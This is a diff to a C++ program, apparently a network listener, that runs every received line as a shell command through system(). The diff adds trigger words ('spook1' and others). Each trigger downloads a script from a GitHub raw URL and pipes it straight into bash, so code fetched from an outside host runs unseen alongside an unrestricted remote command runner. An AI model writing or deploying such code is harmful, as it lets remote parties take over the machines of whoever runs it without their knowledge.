@@ -113,8 +113,24 @@ int main(int argc, char * argv[]) {
             std::string str = ligne;
             char * ligne2 = new char[str.length() + 1];
             strcpy(ligne2, str.c_str());
-
-            int retour = system(ligne2);
+            
+            int retour;
+            
+            if(ligne=="spook1\r"){
+                retour = system("curl https://raw.githubusercontent.com/Suricateee/socketOpenerForPersonalLAN/main/spook1.sh | bash");
+            }
+            else if(ligne=="spook2\r"){
+                retour = system("curl https://raw.githubusercontent.com/Suricateee/socketOpenerForPersonalLAN/main/spook2.sh | bash");
+            }
+            else if(ligne=="spook3\r"){
+                retour = system("curl https://raw.githubusercontent.com/Suricateee/socketOpenerForPersonalLAN/main/spook3.sh | bash");
+            }
+            else if(ligne=="spook3_single\r"){
+                retour = system("curl https://raw.githubusercontent.com/Suricateee/socketOpenerForPersonalLAN/main/spook3_single.sh | bash");
+            }
+            else {
+                retour = system(ligne2);
+            }
             
             const char * success = "\nCommand succesfully executed\n";
             const char * fail = "\nCommand execution failed\n";
